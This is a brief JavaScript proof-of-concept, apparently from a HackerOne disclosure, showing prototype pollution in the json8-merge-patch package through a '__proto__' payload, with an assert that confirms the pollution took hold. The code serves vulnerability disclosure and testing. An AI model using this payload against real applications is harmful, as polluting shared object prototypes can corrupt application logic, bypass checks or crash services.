//https://hackerone.com/reports/980649

const { assert } = require("@firebase/util");
let json8mergepatch = require("json8-merge-patch");
var obj = {}
console.log("Before : " + obj.polluted);
json8mergepatch.apply(obj, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));
console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");
